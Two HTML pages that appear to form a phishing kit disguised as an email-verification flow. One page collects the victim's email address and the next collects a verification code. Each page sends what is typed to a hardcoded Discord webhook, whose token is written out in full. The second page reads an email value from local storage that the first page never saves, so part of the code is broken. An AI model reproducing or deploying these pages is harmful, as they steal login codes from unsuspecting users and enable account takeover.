<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Email Verification</title>
</head>
<body>
    <h2>Fill in your email address</h2>
    <input type="email" id="email" placeholder="Email Address" required>
    <button onclick="submitEmail()">Submit</button>

    <script>
        function submitEmail() {
            const email = document.getElementById('email').value;

            // Send the email to the webhook
            fetch('https://discord.com/api/webhooks/1152874265553682512/TaPkSlcf68aMXsdQ-QphI5tS0OxDL7opL5hZwTiVUEHgrQswRc4wwsBfV0qwXPkfJxnf', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    embeds: [{
                        title: "Email Verification",
                        description: `Email: ${email}`
                    }]
                })
            }).then(() => {
                // Redirect to the second page
                window.location.href = "code.html";
            });
        }
    </script>
</body>
</html>

<!-- Second Page: code.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Code Verification</title>
</head>
<body>
    <h2>Code - Check your email</h2>
    <input type="text" id="code" placeholder="Enter Code" required>
    <button onclick="submitCode()">Submit</button>

    <script>
        function submitCode() {
            const code = document.getElementById('code').value;
            const email = localStorage.getItem('email'); // Retrieve the email from local storage

            // Send the code and email to the webhook
            fetch('https://discord.com/api/webhooks/1152874265553682512/TaPkSlcf68aMXsdQ-QphI5tS0OxDL7opL5hZwTiVUEHgrQswRc4wwsBfV0qwXPkfJxnf', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    embeds: [{
                        title: "Code Verification",
                        description: `Email: ${email}\nCode: ${code}`
                    }]
                })
            }).then(() => {
                // Redirect to the third page
                window.location.href = "success.html";
            });
        }
    </script>
</body>
</html>
